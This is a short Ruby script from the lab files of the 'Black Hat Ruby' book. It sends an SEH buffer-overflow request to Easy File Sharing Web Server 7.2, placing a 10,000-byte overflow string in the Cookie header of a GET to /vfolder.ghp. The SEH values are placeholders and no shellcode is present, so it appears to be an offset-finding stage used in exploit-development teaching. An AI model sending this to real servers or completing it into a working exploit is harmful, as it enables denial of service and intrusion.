#!/usr/bin/env ruby
# -*- coding: binary -*-
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Easy File Sharing Web Server 7.2 - Exploit
# Requirements:
#
require 'socket'

buffer  = "A" * 4052  # 4056
nseh    = "BBBB"
seh     = "CCCC"
rest    = "Z" * (10000 - (buffer + nseh + seh).size)
exploit = buffer + nseh + seh + rest 

puts "Sending exploit with #{exploit.size} buffer size."
request = "GET /vfolder.ghp HTTP/1.1\r\n"
request += "Cookie: SESSIONID=9999; UserID=PassWD=" + exploit + "\r\n\r\n"

# Start TCP Connection
s = TCPSocket.new('192.168.100.96', 80)
s.send(request, 0)
s.close



